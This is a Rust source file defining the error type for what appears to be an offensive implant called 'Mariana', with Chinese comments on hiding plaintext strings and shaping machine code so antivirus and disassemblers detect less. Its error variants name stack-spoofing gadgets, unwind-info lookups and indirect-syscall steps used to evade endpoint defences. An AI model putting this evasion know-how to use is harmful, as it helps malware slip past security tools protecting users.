// 最隐蔽的方案永远是藏在大量普通的指令中
// 1. #[cfg_attr(debug_assertions, derive(Debug))]
// #[derive(Debug)],会使编译器自动生成core::fmt::Debug trait,且编译器在最终编译出的.exe/.dll二进制的.rdata只读数据节中,硬编码写入所有变体明文的ASCII字符串.
// 而这种方式在debug时会保留,在release时,编译器会剔除debug特征及对应的明文字符串.但即使release下把所有错误字符串杀光,选择repr属性仍具有重要的物理层意义
// 2. repr决定cpu生成的汇编指令.杀软和反汇编在没有字符串能看时,看的就是二进制机器码opcode的指令形态.
//  2.1 #[repr(u8)],编译器生成的汇编指令 mov al,1 且后面经常需要接一条零扩展指令movzx eax,al 在反汇编里,频繁出现movzx这种零扩展指令,就是一种特征
//  2.2 #[repr(u32)],编译器生成的汇编是 mov eax,1 这是最普遍的机器码
// 2.3 #[repr(c)]
// 3. 不显示使用repr,就是使用默认的#[repr(Rust)].那么rust编译器就有自由改变枚举内存大小的权力,填充padding.一旦枚举的物理尺寸不固定,在后续的transmute,内联汇编交互,Result内存拷贝时,会导致解引用时多读或少读字节,引发UB
// 4. 控制Result<T,E>的物理栈对齐.在 Result<(), MarianaError>中,如果用#[repr(u8)]整个Result在栈上只占1字节,u32时 Result在栈上占4字节. 
// 在伪造堆栈时,栈帧上的每一个字节都需要精准操控.
// 以上,#[cfg_attr(debug_assertions, derive(Debug))]用于不输出明文;repr决定生成的cpu汇编形态及内存尺寸,防止UB的必要手段

// 关于用enum模拟win64的返回值NTSTATUS,enum中从1开始,即避免和NTSTATUS代表的系统错误冲突,又能在底层转为大量常见的汇编指令,增强隐蔽性

pub type Result<T>=core::result::Result<T,MarianaError>;

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone,Copy,Eq,PartialEq)]
#[repr(u32)]
pub enum MarianaError {
    // uwd.rs中用到的错误
    TooManyArguments=1,
    NullFunctionAddress,
    NotFoundKernelBase,
    FailedToReadIMAGE_RUNTIME_FUNCTIONEntrieFromPdataSection,
    ntdllnotfound,
    kernel32notfound,
    rlt_user_addrnotfound,
    base_thread_addrnotfound,
    RtlUserThreadStartunwindinfonotfound,
    BaseThreadInitThunkunwindinfonotfound,
    RtlUserThreadStartstacksizenotfound,
    BaseThreadInitThunkstacksizenotfound,
    firstprolognotfound,
    secondprolognotfound,
    addrspgadgetnotfound,
    jmprbxgadgetnotfound,
    ntdlldllnotfound,
    get_proc_addressreturnednull,
    ssnnotfound,
    syscalladdressnotfound,

}

#[macro_export]
macro_rules! stealth_bail {
    ($err:expr) => {
        return Err($err);
    };
}